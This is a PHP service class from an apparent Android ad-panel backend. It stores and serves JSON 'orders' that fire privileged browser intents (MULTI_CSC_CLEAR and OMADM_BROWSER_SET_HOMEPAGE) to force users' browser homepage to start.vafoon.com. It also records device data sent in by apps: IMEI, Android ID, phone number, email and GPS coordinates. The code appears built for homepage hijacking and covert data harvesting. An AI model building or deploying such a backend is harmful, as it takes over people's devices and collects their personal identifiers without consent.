<?php

/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 * Description of MongoService
 *
 * @author tuguu
 */

namespace adsPanel\BackendBundle\Services;

use adsPanel\BackendBundle\Document\Respuesta;
use adsPanel\BackendBundle\Document\PhoneModel;
use adsPanel\BackendBundle\Document\Fabricant;
use adsPanel\BackendBundle\Document\Language;
use adsPanel\BackendBundle\Document\NetworkOperator;
use adsPanel\BackendBundle\Document\AppAndroid;
use adsPanel\BackendBundle\Document\Country;
use adsPanel\BackendBundle\Document\Request;

class MongoService {

    protected $managerMongo;

    public function __construct($mongo) {
        $this->managerMongo = $mongo->getManager();
    }

    /* Here initialize te constant values to the db, for the Document Respuesta */

    public function initValues() {
        $URL_REDIRECT = 'start.vafoon.com';
        $intent = new Respuesta();
        $intent->setIdentificador('receiver');
        $intent->setIntent('android.intent.action.MULTI_CSC_CLEAR');
        $intent->setPaquete('com.android.browser');
        $intent->setComponente('com.android.browser.BrowserHomepageSetReceiver');
        $this->managerMongo->persist($intent);
        $intent1 = new Respuesta();
        $intent1->setIdentificador('homepage');
        $intent1->setIntent('android.intent.action.OMADM_BROWSER_SET_HOMEPAGE');
        $intent1->setAtributo('homepage');
        $intent1->setValor($URL_REDIRECT);
        $this->managerMongo->persist($intent1);
        
        $this->managerMongo->flush();
    }

    public function getJSONordersToAndroid() {
        $repository = $this->managerMongo->getRepository('BackendBundle:Respuesta');
        $intent1 = $repository->findOneByIdentificador('receiver');
        $intent2 = $repository->findOneByIdentificador('homepage');
        $array = array(
            $intent1->getIdentificador() => array(
                'intent' => $intent1->getIntent(),
                'paquete' => $intent1->getPaquete(),
                'componente' => $intent1->getComponente()
            ),
            $intent2->getIdentificador() => array(
                'intent' => $intent2->getIntent(),
                'atributo' => $intent2->getAtributo(),
                'valor' => $intent2->getValor()
            )
        );
        return json_encode($array);
    }

    public function insertLanguage($name_language) {
        $result = $this->managerMongo->getRepository('BackendBundle:Language')->findOneByLanguage($name_language);
        //CHECK IF EXISTS THE FIELD
        if ($result) {
            $language = $result;
        } else {
            $language = new Language();
            $language->setLanguage($name_language);
            $this->managerMongo->persist($language);
            $this->managerMongo->flush();
        }
        return $language;
    }

    public function insertNetworkOperator($name) {
        $result = $this->managerMongo->getRepository('BackendBundle:NetworkOperator')->findOneByName($name);
        //CHECK IF EXISTS THE FIELD
        if ($result) {
            $network = $result;
        } else {
            $network = new NetworkOperator();
            $network->setName($name);
            $this->managerMongo->persist($network);
            $this->managerMongo->flush();
        }
        return $network;
    }

    public function insertCountry($name) {
        $result = $this->managerMongo->getRepository('BackendBundle:Country')->findOneByName($name);
        //CHECK IF EXISTS THE FIELD
        if ($result) {
            $country = $result;
        } else {
            $country = new Country();
            $country->setName($name);
            $this->managerMongo->persist($country);
            $this->managerMongo->flush();
        }
        return $country;
    }

    public function insertFabricant($name) {
        $result = $this->managerMongo->getRepository('BackendBundle:Fabricant')->findOneByName($name);
        //CHECK IF EXISTS THE FIELD
        if ($result) {
            $fabricant = $result;
        } else {
            $fabricant = new Fabricant();
            $fabricant->setName($name);
            $this->managerMongo->persist($fabricant);
            $this->managerMongo->flush();
        }
        return $fabricant;
    }

    public function insertPhoneModel($name, $name_fabricant) {
        $result = $this->managerMongo->getRepository('BackendBundle:PhoneModel')->findOneByPhoneModel($name);
        //CHECK IF EXISTS THE FIELD
        if ($result) {
            $model = $result;
        } else {
            $model = new PhoneModel();
            $model->setPhoneModel($name);
            $model->setFabricant($this->insertFabricant($name_fabricant));
            $this->managerMongo->persist($model);
            $this->managerMongo->flush();
        }
        return $model;
    }

    public function insertApp($name, $package, $version) {
        $result = $this->managerMongo->getRepository('BackendBundle:AppAndroid')->findOneBy(array('nameApp' => $name, 'packageName' => $package, 'versionApp' => $version));
        //CHECK IF EXISTS THE FIELD
        if ($result) {
            $app = $result;
        } else {
            $app = new AppAndroid();
            $app->setNameApp($name);
            $app->setPackageName($package);
            $app->setVersionApp($version);
            $this->managerMongo->persist($app);
            $this->managerMongo->flush();
        }
        return $app;
    }

    public function insertRequestByJSON($json) {
        //NOT IS NECESARY CHECK IF THE REQUEST EXISTS, A APPLICATION ONLY SEND INFO 1 TIME BY APP
        $model = $this->insertPhoneModel($json['phone_model'], $json['fabricant_phone']);
        $network = $this->insertNetworkOperator($json['network_operator']);
        $language = $this->insertLanguage($json['language']);
        $country = $this->insertCountry($json['country']);
        $app = $this->insertApp($json['name_app'], $json['package_name'], $json['version_app']);

        $request = new Request();
        $request->setForeignApp($app);
        $request->setForeignCountry($country);
        $request->setForeignLanguage($language);
        $request->setForeignNetworkOperator($network);
        $request->setForeignPhoneModel($model);
        $request->setImei($json['imei']);
        $request->setIsTablet($json['isTablet']);
        $request->setScreenSize($json['screen_size']);
        $request->setSdkVersion($json['sdk_version']);
        $request->setAndroidId($json['android_id']);
        $request->setWifi($json['wifi']);
        $request->setSd($json['sd']);
        $request->setNetworkSubtype($json['network_subtype']);
        if (isset($json['latitude'])) {
            $request->setLactitude($json['latitude']);
        }if(isset($json['phone_number'])){
        $request->setPhoneNumber($json['phone_number']);}
        if (isset($json['longitude'])) {
            $request->setLongitude($json['longitude']);
        }
        if (isset($json['email'])) {
            $request->setEmail($json['email']);
        }
        $this->managerMongo->persist($request);
        $this->managerMongo->flush();
        return $request;
    }

}

?>
